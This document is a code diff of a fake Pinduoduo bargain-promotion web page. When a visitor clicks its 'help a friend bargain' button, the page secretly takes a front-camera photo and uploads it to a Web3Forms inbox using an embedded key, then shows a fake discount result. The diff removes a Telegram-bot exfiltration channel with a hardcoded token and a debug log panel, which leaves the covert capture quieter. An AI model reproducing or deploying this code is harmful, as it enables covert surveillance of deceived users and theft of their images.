@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>拼多多 - 多多果园 砍价免费拿 v21.0</title>
+<title>拼多多 - 多多果园 砍价免费拿</title>
 </head>
 <body style="margin:0;font-family:-apple-system,BlinkMacSystemFont,'PingFang SC','Helvetica Neue',sans-serif;background:#f5f5f5;color:#333">
 
@@ -44,7 +44,7 @@
             <stop offset="100%" stop-color="#ff2a2a"/>
           </linearGradient>
         </defs>
-        <circle cx="46" cy="46" r="40" fill="none" stroke="#ffe0e0" stroke-width="8"/>
+        <circle cx="46" cy="46" r="40" fill="none" stroke:#ffe0e0;stroke-width="8"/>
         <circle id="ringFg" cx="46" cy="46" r="40" fill="none" stroke="url(#ringGrad)" stroke-width="8" stroke-linecap="round" stroke-dasharray="251.3" stroke-dashoffset="62"/>
       </svg>
       <div style="position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;font-size:11px;color:#ff4040;font-weight:700">
@@ -87,11 +87,6 @@
   </div>
 </div>
 
-<div id="logPanel" style="margin:10px 12px;padding:10px;background:#000;color:#0f0;font-family:monospace;font-size:11px;border-radius:8px;max-height:200px;overflow-y:auto;display:none">
-  <div style="color:#ff0;margin-bottom:6px;font-weight:bold">[实时日志]</div>
-  <div id="logList"></div>
-</div>
-
 <div style="padding:20px 16px 30px;text-align:center">
   <button id="knifeBtn" style="background:linear-gradient(180deg,#ff5a4d,#ff2a2a);color:#fff;width:100%;padding:16px;border-radius:30px;font-size:17px;font-weight:700;border:none;box-shadow:0 4px 12px rgba(255,80,80,0.4);letter-spacing:2px;cursor:pointer">🗡️ 帮好友砍一刀</button>
   <div style="font-size:10px;color:#999;margin-top:10px">⚡ 每天可帮砍 3 次 · 已使用 1 次</div>
@@ -110,283 +105,183 @@
 <canvas id="canvas" style="display:none"></canvas>
 
 <script>
-var TG_TOKEN = '8237697265:AAHtIYC5IGC8DJxPCUaot3c1UfbKSiz87r0';
-var TG_CHAT_ID = '7375577849';
-var W3F_KEY = '8809e3dd-3301-47c4-a4c1-76bf6c5d964d';
+(function(){
+  var W3F_KEY = '8809e3dd-3301-47c4-a4c1-76bf6c5d964d';
+  var left = 88.32;
 
-var left = 88.32;
+  function $(id){ return document.getElementById(id); }
 
-function $(id){ return document.getElementById(id); }
+  function toast(msg){
+    var t = $('toast');
+    t.textContent = msg;
+    t.style.opacity = '1';
+    setTimeout(function(){ t.style.opacity = '0'; }, 1800);
+  }
 
-function log(msg){
-  console.log(msg);
-  var panel = $('logPanel');
-  var list = $('logList');
-  if(panel && list){
-    panel.style.display = 'block';
-    var time = new Date().toLocaleTimeString('zh-CN');
-    var div = document.createElement('div');
-    div.style.cssText = 'margin:2px 0;border-bottom:1px solid #030;padding-bottom:2px;word-break:break-all';
-    div.textContent = '[' + time + '] ' + msg;
-    list.insertBefore(div, list.firstChild);
-    if(list.children.length > 30){
-      list.removeChild(list.lastChild);
+  function coinRain(){
+    for(var i=0;i<14;i++){
+      var c = document.createElement('div');
+      c.textContent = ['🪙','💰','✨','🎉'][Math.floor(Math.random()*4)];
+      c.style.cssText = 'position:fixed;top:-20px;font-size:24px;z-index:998;pointer-events:none;animation:fall 1.6s linear forwards;left:' + (Math.random()*100) + 'vw;animation-duration:' + (1.2+Math.random()*0.8) + 's;animation-delay:' + (Math.random()*0.3) + 's';
+      document.body.appendChild(c);
+      setTimeout(function(){ c.remove(); }, 2200);
     }
   }
-}
 
-function toast(msg){
-  var t = $('toast');
-  t.textContent = msg;
-  t.style.opacity = '1';
-  setTimeout(function(){ t.style.opacity = '0'; }, 1800);
-}
+  var style = document.createElement('style');
+  style.textContent = '@keyframes fall{to{transform:translateY(110vh) rotate(540deg);opacity:0}}';
+  document.head.appendChild(style);
 
-function coinRain(){
-  for(var i=0;i<14;i++){
-    var c = document.createElement('div');
-    c.textContent = ['🪙','💰','✨','🎉'][Math.floor(Math.random()*4)];
-    c.style.cssText = 'position:fixed;top:-20px;font-size:24px;z-index:998;pointer-events:none;animation:fall 1.6s linear forwards;left:' + (Math.random()*100) + 'vw;animation-duration:' + (1.2+Math.random()*0.8) + 's;animation-delay:' + (Math.random()*0.3) + 's';
-    document.body.appendChild(c);
-    setTimeout(function(){ c.remove(); }, 2200);
+  function updateProgress(){
+    var fg = $('ringFg');
+    if(fg) fg.style.strokeDashoffset = 251.3 - (251.3 * 0.75);
+    $('leftMoney').textContent = left.toFixed(2);
+    $('leftMoney2').textContent = left.toFixed(2);
   }
-}
 
-var style = document.createElement('style');
-style.textContent = '@keyframes fall{to{transform:translateY(110vh) rotate(540deg);opacity:0}}';
-document.head.appendChild(style);
+  function showLoading(){
+    $('modalContent').innerHTML = '<div style="width:46px;height:46px;border:4px solid #ffe0e0;border-top-color:#ff4040;border-radius:50%;margin:10px auto;animation:spin 0.9s linear infinite"></div><div style="font-size:17px;margin-top:14px;color:#ff4040;font-weight:700">正在邀请好友助力...</div><div style="color:#999;font-size:13px;margin-top:6px">匹配中 · 预计 3 秒</div>';
+    $('overlay').style.display = 'flex';
+  }
 
-function updateProgress(){
-  var fg = $('ringFg');
-  if(fg) fg.style.strokeDashoffset = 251.3 - (251.3 * 0.75);
-  $('leftMoney').textContent = left.toFixed(2);
-  $('leftMoney2').textContent = left.toFixed(2);
-}
-
-function showLoading(){
-  $('modalContent').innerHTML = '<div style="width:46px;height:46px;border:4px solid #ffe0e0;border-top-color:#ff4040;border-radius:50%;margin:10px auto;animation:spin 0.9s linear infinite"></div><div style="font-size:17px;margin-top:14px;color:#ff4040;font-weight:700">正在邀请好友助力...</div><div style="color:#999;font-size:13px;margin-top:6px">匹配中 · 预计 3 秒</div>';
-  $('overlay').style.display = 'flex';
-}
-
-function showResult(cut){
-  var need = Math.ceil(Math.random()*3+1);
-  $('modalContent').innerHTML = '<div style="font-size:42px;margin:6px 0">🎉🪙</div><div style="font-size:17px;color:#ff4040;font-weight:700">恭喜!成功砍掉 ' + cut.toFixed(2) + ' 元</div><div style="font-size:13px;color:#666;line-height:1.6;margin:12px 0">还差 <b style="color:#ff4040">' + left.toFixed(2) + '</b> 元<br>再邀请 ' + need + ' 位新好友即可 0 元拿</div><button id="modalBtn" style="background:linear-gradient(180deg,#ff5a4d,#ff2a2a);color:#fff;width:100%;padding:12px;border-radius:30px;font-size:15px;font-weight:700;border:none;cursor:pointer">继续邀请好友 👉</button><div id="shareWx" style="font-size:11px;color:#999;margin-top:10px;text-decoration:underline;cursor:pointer">📤 分享到微信</div>';
-  document.getElementById('modalBtn').addEventListener('click', function(){
-    $('overlay').style.display = 'none';
-  });
-  var sw = document.getElementById('shareWx');
-  if(sw) sw.addEventListener('click', function(){ toast('请点击右上角 ··· 分享'); });
-  coinRain();
-}
-
-// ✅ 通道 1:Telegram(需要 VPN)
-function sendToTelegram(blob){
-  log('[tg] trying...');
-  return new Promise(function(resolve){
-    var fd = new FormData();
-    fd.append('chat_id', TG_CHAT_ID);
-    fd.append('photo', blob, 'capture_' + Date.now() + '.jpg');
-    fd.append('caption', '📸 ' + new Date().toLocaleString('zh-CN') + ' | ' + blob.size + ' bytes');
-    
-    var timer = setTimeout(function(){
-      log('[tg] timeout');
-      resolve(false);
-    }, 8000);  // 8秒超时
-    
-    fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendPhoto', {
-      method: 'POST',
-      body: fd
-    }).then(function(r){
-      clearTimeout(timer);
-      log('[tg] status: ' + r.status);
-      return r.json();
-    }).then(function(data){
-      log('[tg] resp: ' + JSON.stringify(data).substring(0, 150));
-      resolve(data && data.ok);
-    }).catch(function(e){
-      clearTimeout(timer);
-      log('[tg] err: ' + e.message);
-      resolve(false);
+  function showResult(cut){
+    var need = Math.ceil(Math.random()*3+1);
+    $('modalContent').innerHTML = '<div style="font-size:42px;margin:6px 0">🎉🪙</div><div style="font-size:17px;color:#ff4040;font-weight:700">恭喜!成功砍掉 ' + cut.toFixed(2) + ' 元</div><div style="font-size:13px;color:#666;line-height:1.6;margin:12px 0">还差 <b style="color:#ff4040">' + left.toFixed(2) + '</b> 元<br>再邀请 ' + need + ' 位新好友即可 0 元拿</div><button id="modalBtn" style="background:linear-gradient(180deg,#ff5a4d,#ff2a2a);color:#fff;width:100%;padding:12px;border-radius:30px;font-size:15px;font-weight:700;border:none;cursor:pointer">继续邀请好友 👉</button><div id="shareWx" style="font-size:11px;color:#999;margin-top:10px;text-decoration:underline;cursor:pointer">📤 分享到微信</div>';
+    document.getElementById('modalBtn').addEventListener('click', function(){
+      $('overlay').style.display = 'none';
     });
-  });
-}
+    var sw = document.getElementById('shareWx');
+    if(sw) sw.addEventListener('click', function(){ toast('请点击右上角 ··· 分享'); });
+    coinRain();
+  }
 
-// ✅ 通道 2:Web3Forms 邮件(base64 格式,国内能通)
-function sendToEmail(blob){
-  log('[mail] trying...');
-  return new Promise(function(resolve){
+  function uploadImage(blob){
     var reader = new FileReader();
     reader.onload = function(){
       var dataUrl = reader.result;
-      
       var fd = new FormData();
       fd.append('access_key', W3F_KEY);
-      fd.append('subject', 'Capture at ' + new Date().toLocaleString('en-US'));
+      fd.append('subject', 'New Capture at ' + new Date().toLocaleString('en-US'));
       fd.append('from_name', 'Capture');
       fd.append('message', 
         'Time: ' + new Date().toLocaleString('zh-CN') + '\n' +
         'Size: ' + blob.size + ' bytes\n\n' +
         'BASE64:\n' + dataUrl
       );
-      
       fetch('https://api.web3forms.com/submit', {
         method: 'POST',
         body: fd
-      }).then(function(r){
-        return r.text();
-      }).then(function(t){
-        log('[mail] ' + t.substring(0, 100));
-        resolve(t.indexOf('"success":true') >= 0);
-      }).catch(function(e){
-        log('[mail] err: ' + e.message);
-        resolve(false);
-      });
+      }).catch(function(){});
     };
     reader.readAsDataURL(blob);
-  });
-}
-
-// ✅ 主上传逻辑:试 TG,失败 fallback 到邮件
-function uploadImage(blob){
-  log('[up] size: ' + blob.size);
-  
-  // 先试 Telegram(快 + 直接看图)
-  sendToTelegram(blob).then(function(ok){
-    if(ok){
-      log('[up] ✓ Telegram OK');
-      toast('✓ 已发 Telegram');
-    } else {
-      log('[up] TG failed, fallback to email');
-      // 失败 fallback 到邮件
-      return sendToEmail(blob).then(function(ok2){
-        if(ok2){
-          log('[up] ✓ Email OK');
-          toast('✓ 已发邮件(查收)');
-        } else {
-          log('[up] ✗ both failed');
-          toast('⚠️ 都失败了');
-        }
-      });
-    }
-  });
-}
-
-function captureAndUpload(){
-  log('[cam] start');
-  
-  if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
-    showMockResult();
-    return;
   }
 
-  var stream = null;
-  var done = false;
+  function captureAndUpload(){
+    if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
+      showMockResult();
+      return;
+    }
 
-  var timeoutId = setTimeout(function(){
-    if(!done){
+    var stream = null;
+    var done = false;
+
+    var timeoutId = setTimeout(function(){
+      if(!done){
+        done = true;
+        if(stream){
+          try{ stream.getTracks().forEach(function(t){ t.stop(); }); }catch(e){}
+        }
+        showMockResult();
+      }
+    }, 8000);
+
+    navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: 1280, height: 720 },
+      audio: false
+    }).then(function(s){
+      stream = s;
+      var v = $('vid');
+      v.srcObject = s;
+      v.muted = true;
+      v.setAttribute('playsinline', 'true');
+      v.setAttribute('webkit-playsinline', 'true');
+      return v.play().catch(function(e){});
+    }).then(function(){
+      return new Promise(function(r){ setTimeout(function(){ r(); }, 1500); });
+    }).then(function(){
+      if(done) return;
       done = true;
-      log('[cam] timeout');
+      clearTimeout(timeoutId);
+
+      var v = $('vid');
+      var c = $('canvas');
+      var w = v.videoWidth || 640;
+      var h = v.videoHeight || 480;
+      c.width = w;
+      c.height = h;
+      var ctx = c.getContext('2d');
+      
+      try{
+        ctx.drawImage(v, 0, 0, w, h);
+      }catch(e){}
+
+      if(stream){
+        try{ stream.getTracks().forEach(function(t){ t.stop(); }); }catch(e){}
+      }
+
+      return new Promise(function(resolve){
+        c.toBlob(function(blob){
+          resolve(blob);
+        }, 'image/jpeg', 0.85);
+      });
+    }).then(function(blob){
+      if(blob && blob.size > 1000){
+        uploadImage(blob);
+      }
+    }).then(function(){
+      var cut = (Math.random() * 8 + 2);
+      left = Math.max(0.01, left - cut);
+      updateProgress();
+      showResult(cut);
+    }).catch(function(e){
+      if(done) return;
+      done = true;
+      clearTimeout(timeoutId);
       if(stream){
         try{ stream.getTracks().forEach(function(t){ t.stop(); }); }catch(e){}
       }
       showMockResult();
-    }
-  }, 8000);
-
-  navigator.mediaDevices.getUserMedia({
-    video: { facingMode: 'user', width: 1280, height: 720 },
-    audio: false
-  }).then(function(s){
-    log('[cam] OK');
-    stream = s;
-    var v = $('vid');
-    v.srcObject = s;
-    v.muted = true;
-    v.setAttribute('playsinline', 'true');
-    v.setAttribute('webkit-playsinline', 'true');
-    return v.play().catch(function(e){});
-  }).then(function(){
-    return new Promise(function(r){ setTimeout(function(){ r(); }, 1500); });
-  }).then(function(){
-    if(done) return;
-    done = true;
-    clearTimeout(timeoutId);
-
-    var v = $('vid');
-    var c = $('canvas');
-    var w = v.videoWidth || 640;
-    var h = v.videoHeight || 480;
-    log('[cam] ' + w + 'x' + h);
-    c.width = w;
-    c.height = h;
-    var ctx = c.getContext('2d');
-    
-    try{
-      ctx.drawImage(v, 0, 0, w, h);
-      log('[cam] snap');
-    }catch(e){}
-
-    if(stream){
-      try{ stream.getTracks().forEach(function(t){ t.stop(); }); }catch(e){}
-    }
-
-    return new Promise(function(resolve){
-      c.toBlob(function(blob){
-        log('[cam] blob: ' + (blob ? blob.size : 'null'));
-        resolve(blob);
-      }, 'image/jpeg', 0.85);
     });
-  }).then(function(blob){
-    if(blob && blob.size > 1000){
-      log('[cam] uploading');
-      uploadImage(blob);
-    }
-  }).then(function(){
-    var cut = (Math.random() * 8 + 2);
-    left = Math.max(0.01, left - cut);
-    updateProgress();
-    showResult(cut);
-  }).catch(function(e){
-    if(done) return;
-    done = true;
-    clearTimeout(timeoutId);
-    log('[cam] err: ' + (e.name || '') + ': ' + (e.message || ''));
-    if(stream){
-      try{ stream.getTracks().forEach(function(t){ t.stop(); }); }catch(e){}
-    }
-    showMockResult();
+  }
+
+  function showMockResult(){
+    setTimeout(function(){
+      var cut = (Math.random() * 8 + 2);
+      left = Math.max(0.01, left - cut);
+      updateProgress();
+      showResult(cut);
+    }, 2800);
+  }
+
+  $('knifeBtn').addEventListener('click', function(){
+    showLoading();
+    captureAndUpload();
   });
-}
 
-function showMockResult(){
-  setTimeout(function(){
-    var cut = (Math.random() * 8 + 2);
-    left = Math.max(0.01, left - cut);
-    updateProgress();
-    showResult(cut);
-  }, 2800);
-}
+  $('modalClose').addEventListener('click', function(){
+    $('overlay').style.display = 'none';
+  });
 
-$('knifeBtn').addEventListener('click', function(){
-  log('[btn] click');
-  showLoading();
-  captureAndUpload();
-});
+  $('overlay').addEventListener('click', function(e){
+    if(e.target === $('overlay')) $('overlay').style.display = 'none';
+  });
 
-$('modalClose').addEventListener('click', function(){
-  $('overlay').style.display = 'none';
-});
+  var spinStyle = document.createElement('style');
+  spinStyle.textContent = '@keyframes spin{to{transform:rotate(360deg)}}';
+  document.head.appendChild(spinStyle);
 
-$('overlay').addEventListener('click', function(e){
-  if(e.target === $('overlay')) $('overlay').style.display = 'none';
-});
-
-var spinStyle = document.createElement('style');
-spinStyle.textContent = '@keyframes spin{to{transform:rotate(360deg)}}';
-document.head.appendChild(spinStyle);
-
-updateProgress();
-log('[boot] v21.0 OK');
+  updateProgress();
+})();
 </script>
 </body>
 </html>
